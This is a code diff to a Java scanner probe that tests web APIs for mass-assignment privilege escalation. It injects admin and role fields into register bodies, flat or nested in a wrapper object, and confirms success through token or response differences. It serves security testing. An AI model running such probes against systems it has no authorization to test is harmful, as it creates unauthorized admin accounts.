@@ -129,29 +129,95 @@ public final class BodyMutatorProbe extends Probe {
         }
     }
 
-    /** Inject privilege fields into a create/register body and CONFIRM escalation via token readback. */
+    /** Inject privilege fields and CONFIRM escalation — tries two injection paths:
+     *  (1) flat: appends at the top-level object (VAmPI/crAPI, flat JSON register bodies);
+     *  (2) nested: injects inside a single-key wrapper object like {"user":{...}} or {"data":{...}}
+     *      (RealWorld/FastAPI convention — Body(..., embed=True, alias="user") silently ignores
+     *      top-level fields, so flat injection lands at the wrong level and is never seen by the handler). */
     private void massAssign(HttpRequest req, String body) {
         try {
-            // The CONTROL body must carry NO privilege field (else both principals are elevated and the
-            // differential is void). Strip any privilege field the seeded/captured body already contains.
             String clean = stripPrivileges(body);
-            String injected = clean.replaceFirst("\\}\\s*$", Matcher.quoteReplacement(PRIV_INJECT) + "}");
-            if (injected.equals(clean)) return;                      // no trailing '}' → not a JSON object
-            int seq = SEQ.incrementAndGet();
-            // Register/create endpoints reject a duplicate identity, so give the control and injected requests
-            // DISTINCT identities; then the ONLY difference between the two principals is the injected field.
-            HttpRequestResponse control   = send(req.withBody(uniquifyIdentity(clean,    "maC" + seq)));
-            HttpRequestResponse injectedR = send(req.withBody(uniquifyIdentity(injected, "maI" + seq)));
-            String key = confirmPrivViaToken(control, injectedR);
-            if (key != null) {
-                scanLog.found("Mass assignment → privilege escalation", req.url(),
-                        "An undocumented privilege field injected into the create/register body surfaced TRUTHY ("
-                        + key + ") in the principal encoded in the server-issued token, while a control account "
-                        + "without the field did not — a confirmed privilege escalation (CWE-915/CWE-269).",
-                        injectedR);
-                scanLog.incFinding();
+
+            // Path 1 — flat injection (top-level). Works for non-wrapped JSON bodies.
+            String injectedFlat = clean.replaceFirst("\\}\\s*$", Matcher.quoteReplacement(PRIV_INJECT) + "}");
+            if (!injectedFlat.equals(clean)) {
+                int seq = SEQ.incrementAndGet();
+                HttpRequestResponse ctrl = send(req.withBody(uniquifyIdentity(clean,        "maC" + seq)));
+                HttpRequestResponse inj  = send(req.withBody(uniquifyIdentity(injectedFlat, "maI" + seq)));
+                String key = confirmPriv(ctrl, inj);
+                if (key != null) { reportPrivEsc(req.url(), key, inj); return; }
             }
+
+            // Path 2 — nested wrapper injection. When the entire body is {"wrapper":{...}}, the privilege
+            // fields must go INSIDE the inner object, not alongside the wrapper key.
+            try {
+                org.json.JSONObject top = new org.json.JSONObject(clean);
+                if (top.length() == 1) {
+                    String wrapKey = top.keys().next();
+                    Object wrapVal = top.opt(wrapKey);
+                    if (wrapVal instanceof org.json.JSONObject) {
+                        org.json.JSONObject inner = stripPrivilegesFromObj((org.json.JSONObject) wrapVal);
+                        // build injected inner: copy + add privilege fields
+                        org.json.JSONObject injInner = new org.json.JSONObject(inner.toString());
+                        injInner.put("admin", true); injInner.put("is_admin", true);
+                        injInner.put("isAdmin", true); injInner.put("role", "admin");
+                        injInner.put("is_staff", true); injInner.put("is_superuser", true);
+                        org.json.JSONObject outerClean = new org.json.JSONObject();
+                        outerClean.put(wrapKey, inner);
+                        org.json.JSONObject outerInj = new org.json.JSONObject();
+                        outerInj.put(wrapKey, injInner);
+                        int seq2 = SEQ.incrementAndGet();
+                        HttpRequestResponse ctrl2 = send(req.withBody(uniquifyIdentity(outerClean.toString(), "maC" + seq2)));
+                        HttpRequestResponse inj2  = send(req.withBody(uniquifyIdentity(outerInj.toString(),   "maI" + seq2)));
+                        String key2 = confirmPriv(ctrl2, inj2);
+                        if (key2 != null) reportPrivEsc(req.url(), key2, inj2);
+                    }
+                }
+            } catch (Throwable ignore) { }  // JSONObject parse failure → not valid JSON, skip nested path
+
         } catch (Throwable ignore) { }
+    }
+
+    private void reportPrivEsc(String url, String key, HttpRequestResponse evidence) {
+        scanLog.found("Mass assignment → privilege escalation", url,
+                "An undocumented privilege field injected into the request body surfaced TRUTHY ("
+                + key + ") in the server's response or issued token, while a control request "
+                + "without the field did not — confirmed privilege escalation (CWE-915/CWE-269).",
+                evidence);
+        scanLog.incFinding();
+    }
+
+    /** Try both oracles in order: JWT readback first (strongest — the server confirmed the claim),
+     *  then response-body differential (handles apps that return an updated user object, not a new token). */
+    private static String confirmPriv(HttpRequestResponse control, HttpRequestResponse injected) {
+        String key = confirmPrivViaToken(control, injected);
+        if (key == null) key = confirmPrivViaResponseBody(control, injected);
+        return key;
+    }
+
+    /** Privilege field that is TRUTHY in the injected RESPONSE BODY but NOT in the control's.
+     *  Catches apps that echo the updated user object (e.g. PUT /api/user → {"user":{"admin":true,...}})
+     *  rather than issuing a new JWT — the JWT oracle misses these entirely. */
+    private static String confirmPrivViaResponseBody(HttpRequestResponse control, HttpRequestResponse injected) {
+        if (injected == null || injected.response() == null) return null;
+        String ij = injected.response().bodyToString();
+        if (ij == null) return null;
+        String cj = control != null && control.response() != null ? control.response().bodyToString() : null;
+        for (String k : PRIV_KEYS) {
+            if (truthy(ij, k) && (cj == null || !truthy(cj, k))) return k;
+        }
+        return null;
+    }
+
+    /** Remove privilege fields from a JSONObject (case-insensitive key match). */
+    private static org.json.JSONObject stripPrivilegesFromObj(org.json.JSONObject obj) {
+        org.json.JSONObject clean = new org.json.JSONObject(obj.toString());
+        for (String k : PRIV_KEYS) {
+            for (String key : new java.util.ArrayList<>(clean.keySet())) {
+                if (key.equalsIgnoreCase(k)) clean.remove(key);
+            }
+        }
+        return clean;
     }
 
     /** Remove any privilege field from a JSON body so the control request is un-elevated. */
